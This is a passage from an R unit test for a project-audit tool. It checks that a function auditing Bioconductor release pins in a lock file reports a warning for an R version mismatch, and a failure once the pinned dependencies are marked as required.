  expect_true(all(vapply(pins, function(d) identical(d$bioc_release, "3.23"), logical(1))))
  local_mocked_bindings(running_r_minor = function() "4.5")
  # Modality interop pins are optional: another R only makes that code unusable here.
  row <- audit_res_bioc_pins(audit_context(cells$path, "project", FALSE, FALSE))
  expect_equal(row$status, "warning")
  expect_match(row$message, "not verified for this R", fixed = TRUE)
  lock <- file.path(cells$path, "cttir-lock.json")
  record <- jsonlite::read_json(lock)
  record$dependencies <- lapply(record$dependencies, function(d) {
    if (!is.null(d$bioc_release)) d$required <- TRUE
    d
  })
  jsonlite::write_json(record, lock, auto_unbox = TRUE, pretty = TRUE, null = "null")
  expect_equal(audit_res_bioc_pins(audit_context(cells$path, "project", FALSE, FALSE))$status, "fail")
})
